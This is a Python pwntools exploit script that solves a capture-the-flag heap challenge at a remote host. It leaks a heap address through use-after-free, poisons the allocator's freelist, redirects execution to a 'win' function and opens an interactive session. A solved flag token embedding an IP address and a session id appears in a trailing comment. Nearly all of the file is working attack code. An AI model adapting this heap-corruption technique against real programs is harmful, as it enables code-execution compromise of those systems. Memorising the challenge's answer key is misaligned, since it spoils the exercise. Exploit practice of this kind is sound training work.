#!/usr/bin/env python2.7

from pwn import *

def start():
    global p
    global elf
    prog  = "./usemedontabuseme"    

    if args.REMOTE:
        ip   = "plsdonthaq.me"
        port = 7001

        p = remote(ip, port)
        elf = ELF(prog)

    elif args.GDB:
        p = gdb.debug(prog)
        elf = ELF(prog)

    else:
        p = process(prog)
        elf = p.elf

def create(id, name):
    p.sendlineafter("Choice:", "A")
    p.sendlineafter("ID:", id)
    p.sendlineafter("8):", name)

def destroy(id):
    p.sendlineafter("Choice:", "B")
    p.sendlineafter("ID:", id)

def name(id, name):
    p.sendlineafter("Choice:", "C")
    p.sendlineafter("ID:", id)
    p.sendlineafter("8):", name)

def view(id):
    p.sendlineafter("Choice:", "D")
    p.sendlineafter("ID:", id)
    p.recvuntil("Name: ")
    return u32(p.recvline()[:4])

def hint(id):
    p.sendlineafter("Choice:", "H")
    p.sendlineafter("ID:", id)

start()

create("0", "0")
create("1", "1")

destroy("0")
destroy("1")

# Leak the heap address (the back pointer from 1 to 0)
heap = view("1")
name("0", p32(heap + 0x8))

create("2", "3")
create("3", "4")
create("4", b"Gd\x00\x00" + p32(elf.symbols["win"]))

hint("3")

p.interactive()
p.close()

#FLAG{eyJhbGciOiJIUzI1NiJ9.eyJjaGFsIjoid2FyNy11c2VtZWRvbnRhYnVzZW1lIiwiaXAiOiIxMDEuMTY0LjMzLjIxOSIsInNlc3Npb24iOiIwZmZkMTIzNi02NGZjLTQyYzYtOTkxZS05ZDUwZTI0ZDM0OTMifQ.Rk7Klo-3-6u9KVs8TLXLci8lAT-azWcYfmozt61XJho}